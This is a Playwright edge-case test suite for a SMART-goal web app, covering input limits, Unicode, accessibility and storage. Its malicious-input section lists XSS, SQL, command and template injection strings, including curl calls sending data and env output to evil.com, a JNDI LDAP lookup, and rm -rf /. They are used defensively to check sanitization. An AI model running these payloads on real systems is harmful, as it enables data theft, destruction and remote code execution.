import { test, expect } from '@playwright/test';
import { ApiConfigPage } from '../page-objects/ApiConfigPage';
import { GoalInputPage } from '../page-objects/GoalInputPage';
import { SmartGoalPage } from '../page-objects/SmartGoalPage';
import { TestUtils } from '../fixtures/test-utils';
import { TEST_GOALS } from '../fixtures/test-data';

test.describe('Comprehensive Edge Case Testing', () => {
  let apiConfigPage: ApiConfigPage;
  let goalInputPage: GoalInputPage;
  let smartGoalPage: SmartGoalPage;
  let testUtils: TestUtils;

  test.beforeEach(async ({ page }) => {
    apiConfigPage = new ApiConfigPage(page);
    goalInputPage = new GoalInputPage(page);
    smartGoalPage = new SmartGoalPage(page);
    testUtils = new TestUtils(page);

    await page.goto('/');
    await testUtils.setupApiConfig();
  });

  test.describe('Boundary Value Testing', () => {
    test('should handle exactly at character limit', async () => {
      const characterLimit = 2000; // Assuming 2000 character limit
      const exactLimitGoal = 'A'.repeat(characterLimit);
      
      await goalInputPage.enterGoal(exactLimitGoal);
      
      // Should accept goal at exact limit
      const characterCount = goalInputPage.page.locator('[data-testid="character-count"]');
      await expect(characterCount).toContainText(`${characterLimit}/2000`);
      
      await goalInputPage.clickSubmit();
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('exact-character-limit');
    });

    test('should handle one character over limit', async () => {
      const characterLimit = 2000;
      const overLimitGoal = 'A'.repeat(characterLimit + 1);
      
      await goalInputPage.enterGoal(overLimitGoal);
      
      // Should show validation error
      const validationError = goalInputPage.page.locator('[data-testid="validation-error"]');
      await expect(validationError).toBeVisible();
      await expect(validationError).toContainText('exceeds maximum length');
      
      // Submit button should be disabled
      const submitButton = goalInputPage.page.locator('button:has-text("Transform to SMART Goal")');
      await expect(submitButton).toBeDisabled();
      
      await testUtils.takeScreenshotWithTimestamp('over-character-limit');
    });

    test('should handle minimum valid input', async () => {
      const minimumGoal = 'Get fit'; // Assuming 7 characters is minimum
      
      await goalInputPage.enterGoal(minimumGoal);
      await goalInputPage.clickSubmit();
      
      // Should accept minimum valid input
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('minimum-valid-input');
    });

    test('should handle just below minimum threshold', async () => {
      const belowMinimumGoal = 'Hi'; // Below minimum threshold
      
      await goalInputPage.enterGoal(belowMinimumGoal);
      await goalInputPage.clickSubmit();
      
      // Should show validation error
      const validationError = goalInputPage.page.locator('[data-testid="validation-error"]');
      await expect(validationError).toBeVisible();
      await expect(validationError).toContainText('too short');
      
      await testUtils.takeScreenshotWithTimestamp('below-minimum-input');
    });
  });

  test.describe('Unicode and International Character Testing', () => {
    test('should handle emoji-heavy goals', async () => {
      const emojiGoal = '🚀 Launch my startup 💰 and make $1M 📈 in revenue within 12 months 🎯 by building an amazing product 🔥 and growing our user base to 100K users 👥';
      
      await goalInputPage.enterGoal(emojiGoal);
      await goalInputPage.clickSubmit();
      
      await smartGoalPage.assertSmartGoalDisplayed();
      
      // Should preserve emojis in output
      const smartGoalContent = smartGoalPage.page.locator('[data-testid="smart-goal-content"]');
      await expect(smartGoalContent).toContainText('🚀');
      
      await testUtils.takeScreenshotWithTimestamp('emoji-heavy-goal');
    });

    test('should handle various languages', async () => {
      const multiLanguageGoals = [
        'Увеличить продажи на 25% в течение 6 месяцев', // Russian
        '在6个月内将销售额增加25%', // Chinese
        'Aumentar las ventas en un 25% en 6 meses', // Spanish
        'Augmenter les ventes de 25% en 6 mois', // French
        'Erhöhen Sie den Umsatz um 25% in 6 Monaten', // German
        'Aumentare le vendite del 25% in 6 mesi', // Italian
        '6か月で売上を25％増加させる' // Japanese
      ];
      
      for (const goal of multiLanguageGoals) {
        await goalInputPage.enterGoal(goal);
        await goalInputPage.clickSubmit();
        
        // Should handle international characters
        await testUtils.assertNoErrors();
        
        // Clear for next test
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(1000);
      }
      
      await testUtils.takeScreenshotWithTimestamp('multi-language-support');
    });

    test('should handle right-to-left languages', async () => {
      const rtlGoals = [
        'زيادة المبيعات بنسبة 25% في غضون 6 أشهر', // Arabic
        'להגדיל את המכירות ב-25% תוך 6 חודשים', // Hebrew
        'فروش را در 6 ماه 25 درصد افزایش دهید' // Persian
      ];
      
      for (const goal of rtlGoals) {
        await goalInputPage.enterGoal(goal);
        await goalInputPage.clickSubmit();
        
        // Should handle RTL text correctly
        await testUtils.assertNoErrors();
        
        // Check text direction
        const goalDisplay = smartGoalPage.page.locator('[data-testid="smart-goal-content"]');
        const direction = await goalDisplay.evaluate(el => getComputedStyle(el).direction);
        expect(direction).toBe('rtl');
        
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(1000);
      }
      
      await testUtils.takeScreenshotWithTimestamp('rtl-language-support');
    });

    test('should handle special Unicode characters', async () => {
      const specialUnicodeGoal = `
        Increase revenue by 25% ± 5% within 6 months using advanced analytics 
        and machine learning algorithms (α = 0.05, β = 0.2) to optimize our 
        conversion funnel ∑(x₁ + x₂ + ... + xₙ) where n ≥ 1000 customers
      `.trim();
      
      await goalInputPage.enterGoal(specialUnicodeGoal);
      await goalInputPage.clickSubmit();
      
      await smartGoalPage.assertSmartGoalDisplayed();
      
      // Should preserve special characters
      const smartGoalContent = smartGoalPage.page.locator('[data-testid="smart-goal-content"]');
      await expect(smartGoalContent).toContainText('±');
      await expect(smartGoalContent).toContainText('≥');
      
      await testUtils.takeScreenshotWithTimestamp('special-unicode-characters');
    });
  });

  test.describe('Malicious Input Protection', () => {
    test('should sanitize XSS attempts', async () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')"></embed>',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">'
      ];
      
      for (const xssAttempt of xssAttempts) {
        await goalInputPage.enterGoal(xssAttempt);
        await goalInputPage.clickSubmit();
        
        // Should not execute any scripts
        await testUtils.assertNoScriptExecution();
        
        // Should sanitize the input
        const sanitizedContent = smartGoalPage.page.locator('[data-testid="smart-goal-content"]');
        await expect(sanitizedContent).not.toContainText('<script>');
        await expect(sanitizedContent).not.toContainText('javascript:');
        
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(500);
      }
      
      await testUtils.takeScreenshotWithTimestamp('xss-protection');
    });

    test('should handle SQL injection attempts', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; UPDATE users SET password='hacked' WHERE id=1; --",
        "'; SELECT * FROM admin_users; --",
        "' UNION SELECT username, password FROM users; --",
        "'; DELETE FROM goals; --"
      ];
      
      for (const sqlAttempt of sqlInjectionAttempts) {
        await goalInputPage.enterGoal(`Increase revenue by 25% ${sqlAttempt}`);
        await goalInputPage.clickSubmit();
        
        // Should handle safely without database errors
        await testUtils.assertNoErrors();
        
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(500);
      }
      
      await testUtils.takeScreenshotWithTimestamp('sql-injection-protection');
    });

    test('should handle command injection attempts', async () => {
      const commandInjectionAttempts = [
        '; cat /etc/passwd',
        '`whoami`',
        '$(ls -la)',
        '| rm -rf /',
        '& ping google.com',
        '; curl http://evil.com/steal-data',
        '`curl -X POST http://evil.com/data -d "$(env)"`'
      ];
      
      for (const cmdAttempt of commandInjectionAttempts) {
        await goalInputPage.enterGoal(`Launch product ${cmdAttempt} within 6 months`);
        await goalInputPage.clickSubmit();
        
        // Should not execute any system commands
        await testUtils.assertNoSystemCommandExecution();
        
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(500);
      }
      
      await testUtils.takeScreenshotWithTimestamp('command-injection-protection');
    });

    test('should handle template injection attempts', async () => {
      const templateInjectionAttempts = [
        '{{constructor.constructor("return process")().env}}',
        '${jndi:ldap://evil.com/exploit}',
        '<%=system("whoami")%>',
        '{%exec("rm -rf /")%}',
        '{{config.items()}}',
        '${T(java.lang.Runtime).getRuntime().exec("calc")}'
      ];
      
      for (const templateAttempt of templateInjectionAttempts) {
        await goalInputPage.enterGoal(`Complete project ${templateAttempt} successfully`);
        await goalInputPage.clickSubmit();
        
        // Should not execute template code
        await testUtils.assertNoTemplateExecution();
        
        await goalInputPage.clickClear();
        await testUtils.page.waitForTimeout(500);
      }
      
      await testUtils.takeScreenshotWithTimestamp('template-injection-protection');
    });
  });

  test.describe('Memory and Resource Exhaustion Tests', () => {
    test('should handle extremely large inputs gracefully', async () => {
      const hugeGoal = 'A'.repeat(1000000); // 1MB of text
      
      await goalInputPage.enterGoal(hugeGoal);
      
      // Should handle large input without crashing
      const validationError = goalInputPage.page.locator('[data-testid="validation-error"]');
      await expect(validationError).toBeVisible();
      
      // Memory usage should remain stable
      const memoryUsage = await testUtils.getMemoryUsage();
      expect(memoryUsage).toBeLessThan(500 * 1024 * 1024); // Less than 500MB
      
      await testUtils.takeScreenshotWithTimestamp('huge-input-handling');
    });

    test('should handle rapid input changes', async () => {
      const rapidInputs = Array.from({ length: 100 }, (_, i) => `Goal number ${i + 1}`);
      
      for (const input of rapidInputs) {
        await goalInputPage.enterGoal(input);
        await testUtils.page.waitForTimeout(10); // Very brief delay
      }
      
      // Should handle rapid changes without performance issues
      const finalInput = await goalInputPage.page.locator('[data-testid="goal-input-textarea"]').inputValue();
      expect(finalInput).toBe('Goal number 100');
      
      await testUtils.takeScreenshotWithTimestamp('rapid-input-changes');
    });

    test('should handle nested data structures', async () => {
      const nestedGoal = JSON.stringify({
        goal: {
          primary: {
            objective: {
              main: {
                target: {
                  description: 'Increase revenue by 25%',
                  details: {
                    timeframe: '6 months',
                    metrics: {
                      financial: {
                        revenue: 100000,
                        profit: 25000
                      }
                    }
                  }
                }
              }
            }
          }
        }
      });
      
      await goalInputPage.enterGoal(nestedGoal);
      await goalInputPage.clickSubmit();
      
      // Should parse and handle nested structures
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('nested-data-structures');
    });
  });

  test.describe('Accessibility Edge Cases', () => {
    test('should handle screen reader navigation patterns', async () => {
      // Simulate screen reader navigation
      await goalInputPage.page.keyboard.press('Tab'); // Navigate to goal input
      await goalInputPage.page.keyboard.type('Learn web development in 6 months');
      await goalInputPage.page.keyboard.press('Tab'); // Navigate to submit button
      await goalInputPage.page.keyboard.press('Enter'); // Submit via keyboard
      
      // Should work with keyboard-only navigation
      await smartGoalPage.assertSmartGoalDisplayed();
      
      // Check ARIA attributes
      const submitButton = goalInputPage.page.locator('button:has-text("Transform to SMART Goal")');
      const ariaLabel = await submitButton.getAttribute('aria-label');
      expect(ariaLabel).toBeTruthy();
      
      await testUtils.takeScreenshotWithTimestamp('screen-reader-navigation');
    });

    test('should handle high contrast mode', async () => {
      // Enable high contrast mode simulation
      await testUtils.page.emulateMedia({ colorScheme: 'dark', reducedMotion: 'reduce' });
      
      await goalInputPage.enterGoal('Test goal in high contrast mode');
      await goalInputPage.clickSubmit();
      
      // Should maintain readability in high contrast
      const goalInput = goalInputPage.page.locator('[data-testid="goal-input-textarea"]');
      const computedStyle = await goalInput.evaluate(el => {
        const style = getComputedStyle(el);
        return {
          color: style.color,
          backgroundColor: style.backgroundColor,
          border: style.border
        };
      });
      
      // Colors should have sufficient contrast
      expect(computedStyle.color).not.toBe(computedStyle.backgroundColor);
      
      await testUtils.takeScreenshotWithTimestamp('high-contrast-mode');
    });

    test('should handle zoom levels', async () => {
      const zoomLevels = [0.5, 1.0, 1.5, 2.0, 3.0];
      
      for (const zoom of zoomLevels) {
        await testUtils.page.setViewportSize({ 
          width: Math.floor(1920 / zoom), 
          height: Math.floor(1080 / zoom) 
        });
        
        await goalInputPage.enterGoal(`Test goal at ${zoom}x zoom`);
        
        // Should remain usable at all zoom levels
        const submitButton = goalInputPage.page.locator('button:has-text("Transform to SMART Goal")');
        await expect(submitButton).toBeVisible();
        
        const isClickable = await submitButton.isEnabled();
        expect(isClickable).toBe(true);
        
        await goalInputPage.clickClear();
      }
      
      // Reset viewport
      await testUtils.page.setViewportSize({ width: 1920, height: 1080 });
      
      await testUtils.takeScreenshotWithTimestamp('zoom-level-compatibility');
    });
  });

  test.describe('Browser Compatibility Edge Cases', () => {
    test('should handle legacy browser features', async () => {
      // Simulate older browser capabilities
      await testUtils.page.addInitScript(() => {
        // Remove modern features to simulate older browsers
        delete window.fetch;
        delete window.Promise;
        delete window.Map;
        delete window.Set;
      });
      
      await testUtils.page.reload();
      await testUtils.setupApiConfig();
      
      await goalInputPage.enterGoal('Test with legacy browser simulation');
      await goalInputPage.clickSubmit();
      
      // Should work with polyfills
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('legacy-browser-compatibility');
    });

    test('should handle disabled JavaScript features', async () => {
      // Disable specific JavaScript features
      await testUtils.page.addInitScript(() => {
        // Disable localStorage
        Object.defineProperty(window, 'localStorage', {
          value: undefined,
          writable: false
        });
        
        // Disable sessionStorage
        Object.defineProperty(window, 'sessionStorage', {
          value: undefined,
          writable: false
        });
      });
      
      await testUtils.page.reload();
      await testUtils.setupApiConfig();
      
      await goalInputPage.enterGoal('Test without localStorage');
      await goalInputPage.clickSubmit();
      
      // Should work without localStorage
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('disabled-js-features');
    });
  });

  test.describe('Data Persistence Edge Cases', () => {
    test('should handle storage quota exceeded', async () => {
      // Fill up localStorage to trigger quota exceeded
      await testUtils.page.evaluate(() => {
        try {
          const largeData = 'A'.repeat(1024 * 1024); // 1MB chunks
          for (let i = 0; i < 10; i++) {
            localStorage.setItem(`large-data-${i}`, largeData);
          }
        } catch (e) {
          // Expected to fail when quota exceeded
        }
      });
      
      await goalInputPage.enterGoal('Test with storage quota exceeded');
      await goalInputPage.clickSubmit();
      
      // Should handle gracefully without data persistence
      await smartGoalPage.assertSmartGoalDisplayed();
      
      // Clean up
      await testUtils.page.evaluate(() => {
        for (let i = 0; i < 10; i++) {
          localStorage.removeItem(`large-data-${i}`);
        }
      });
      
      await testUtils.takeScreenshotWithTimestamp('storage-quota-exceeded');
    });

    test('should handle corrupted local storage', async () => {
      // Corrupt localStorage data
      await testUtils.page.evaluate(() => {
        localStorage.setItem('goalData', 'corrupted-json-data{invalid}');
        localStorage.setItem('userPreferences', '{{malformed json}}');
      });
      
      await testUtils.page.reload();
      await testUtils.setupApiConfig();
      
      await goalInputPage.enterGoal('Test with corrupted storage');
      await goalInputPage.clickSubmit();
      
      // Should handle corrupted data gracefully
      await smartGoalPage.assertSmartGoalDisplayed();
      
      await testUtils.takeScreenshotWithTimestamp('corrupted-storage-handling');
    });
  });
});